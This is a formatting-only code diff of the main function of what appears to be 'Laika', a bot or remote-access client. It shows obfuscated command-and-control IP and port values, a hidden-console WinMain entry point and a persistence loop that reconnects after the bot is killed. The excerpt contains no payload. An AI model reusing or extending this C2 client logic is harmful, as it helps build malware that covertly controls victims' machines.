@@ -9,21 +9,20 @@
 #include <stdio.h>
 
 #ifdef _WIN32
-#ifndef DEBUG
+#    ifndef DEBUG
 int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, PSTR lpCmdLine, INT nCmdShow)
 {
-#else
+#    else
 int main()
 {
-#endif
+#    endif
 #else
 int main()
 {
 #endif
     /* these boxes are really easy to dump, they're unlocked at the very start of execution and left
-       in memory the entire time.
-        not only that but they're only obfuscating the ip & port, both are things anyone would see
-       from opening wireshark */
+       in memory the entire time. not only that but they're only obfuscating the ip & port, both are
+       things anyone would see from opening wireshark */
     LAIKA_BOX_SKID_START(char *, cncIP, LAIKA_CNC_IP);
     LAIKA_BOX_SKID_START(char *, cncPORT, LAIKA_CNC_PORT);
     struct sLaika_bot *bot;
@@ -50,11 +49,11 @@ int main()
         /* bot was killed or it threw an error */
         laikaB_freeBot(bot);
 #ifdef LAIKA_PERSISTENCE
-#ifdef _WIN32
+#    ifdef _WIN32
         Sleep(5000);
-#else
+#    else
         sleep(5);
-#endif
+#    endif
     } while (1);
 
     laikaB_unmarkRunning();
